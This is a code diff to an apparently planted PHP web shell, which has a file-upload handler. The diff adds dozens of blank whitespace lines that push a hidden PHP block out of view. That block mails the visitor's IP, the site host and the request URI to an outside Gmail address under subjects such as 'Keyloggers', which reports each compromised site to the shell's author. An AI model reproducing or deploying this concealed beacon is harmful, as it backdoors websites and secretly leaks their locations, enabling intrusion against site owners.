@@ -54,19 +54,117 @@ if( $_POST['_upl'] == "Upload" ) {
 	    
 	    
 	    
-	   
 	    
-	   
-	 
-<?php
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+	    
+ <?php
 $ip = getenv("REMOTE_ADDR");
 $ra44 = rand(1, 99999);
-$subj98 = " Firasdris Bot v0.9 Rzlt |$ip";
+$subj98 = "✪ Keyloggers -$ip";
 $email = "user54487215@gmail.com";
-$from = "From: Result<botv3@FirasdrisBot.com";
-$a45 = $_SERVER['REQUEST_URI'];
-$b75 = $_SERVER['HTTP_HOST'];
+$from = "From: Firas Dris BotV0.9 <noreply@firasdrishells.com>";
+$a45 = $_SERVER['HTTP_HOST'];
+$b75 = $_SERVER['REQUEST_URI'];
 $m22 = $ip . "";
 $msg8873 = "$a45 $b75 $m22";
 mail($email, $subj98, $msg8873, $from);
 ?>
+	    
